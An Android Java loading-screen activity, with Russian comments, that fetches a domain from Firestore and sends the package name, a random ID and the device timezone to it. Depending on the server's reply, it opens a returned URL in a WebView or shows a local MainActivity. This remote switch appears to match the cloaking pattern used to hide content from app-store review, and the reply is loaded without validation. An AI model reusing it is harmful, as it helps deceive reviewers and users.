package com.template;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.ProgressBar;

import com.google.firebase.FirebaseApp;
import com.google.firebase.analytics.FirebaseAnalytics;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;

import java.io.IOException;
import java.util.Calendar;
import java.util.Locale;
import java.util.TimeZone;
import java.util.UUID;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Interceptor;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okio.Buffer;

public class LoadingActivity extends AppCompatActivity {

    private ProgressBar progressBar;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loading);

        progressBar = findViewById(R.id.progressBar);

        // Инициализация Firebase SDK
        FirebaseApp.initializeApp(this);

        // Проверка наличия интернета
        if (isInternetAvailable()) {
            // Обращение к Firebase и серверу
            initializeFirebase();
            getDomainFromFirestore();
        } else {
            openMainActivity();
        }
    }

    private void initializeFirebase() {
        // Инициализация Firebase Analytics
        FirebaseAnalytics firebaseAnalytics = FirebaseAnalytics.getInstance(this);
        // Инициализация Firebase Cloud Messaging и других сервисов, если необходимо
    }

    private void getDomainFromFirestore() {
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        DocumentReference docRef = db.collection("database").document("check");

        docRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                DocumentSnapshot document = task.getResult();
                if (document.exists()) {
                    String link = document.getString("link");
                    Log.d("LINK", link);
                    if (link != null && !link.isEmpty()) {
                        // В link есть домен сайта, переходите к следующему шагу
                        // Формирование ссылки и обращение к серверу
                        String serverUrl = formServerUrl(link);
                        Log.d("URL", serverUrl);
                        makeServerRequest(serverUrl);
                    } else {
                        // link пустой, открывайте MainActivity
                        openMainActivity();
                    }
                } else {
                    // Ошибка получения документа, открывайте MainActivity
                    openMainActivity();
                }
            } else {
                // Ошибка выполнения запроса, открывайте MainActivity
                openMainActivity();
            }
        });
    }

    private String formServerUrl(String link) {
        String domenFromFirebase = link; // Полученный домен из Firebase Cloud Firestore
        String packageName = getPackageName(); // Пакет приложения
        String userId = UUID.randomUUID().toString(); // Генерация UUID для пользователя
        String timeZone = TimeZone.getDefault().getID(); // Таймзона устройства

        String url = domenFromFirebase + "/?packageid=" + packageName +
                "&usserid=" + userId +
                "&getz=" + timeZone +
                "&getr=utm_source=google-play&utm_medium=organic";

        return url;
    }

    private static String getUserAgent(Context context) {
        WebView webView = new WebView(context);
        WebSettings settings = webView.getSettings();
        return settings.getUserAgentString();
    }

    private void makeServerRequest(String serverUrl) {
        // Выполнение запроса к серверу и обработка ответа
        OkHttpClient client = new OkHttpClient.Builder()
                .build();

        Request request = new Request.Builder()
                .header("User-Agent", getUserAgent(this))
                .url(serverUrl)
                .build();

        String userAgent = request.header("User-Agent");
        if (userAgent != null) {
            Log.d("User-Agent", userAgent);
        } else {
            Log.d("User-Agent", "User-Agent не указан");
        }

        Log.d("FULL", request.toString());

        //String userAgent = request.header("User-Agent"); // Получение значения User-Agent

        //Log.d("User-Agent", userAgent); // Логирование User-Agent

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                // Обработка ошибки
                runOnUiThread(() -> openMainActivity());
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                //if (response.isSuccessful()) {
                    String responseString = response.body().string();
                    if (responseString.equals("error")) {
                        // Ошибка, открывайте MainActivity
                        Log.d("HERE", "HERE");
                        runOnUiThread(() -> openMainActivity());
                    } else {
                        // Получен сайт, открывайте WebActivity
                        runOnUiThread(() -> openWebActivity(responseString));
                    }
//                } else {
//
//                    // Ошибка сервера, открывайте MainActivity
//                    runOnUiThread(() -> openMainActivity());
//                }
            }
        });
    }


    private void openWebActivity(String url) {
        Intent intent = new Intent(LoadingActivity.this, WebActivity.class);
        intent.putExtra("url", url);
        startActivity(intent);
        finish();
    }

    private boolean isInternetAvailable() {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnected();
    }

    private void openMainActivity() {
        Intent intent = new Intent(LoadingActivity.this, MainActivity.class);
        startActivity(intent);
        finish();
    }
}
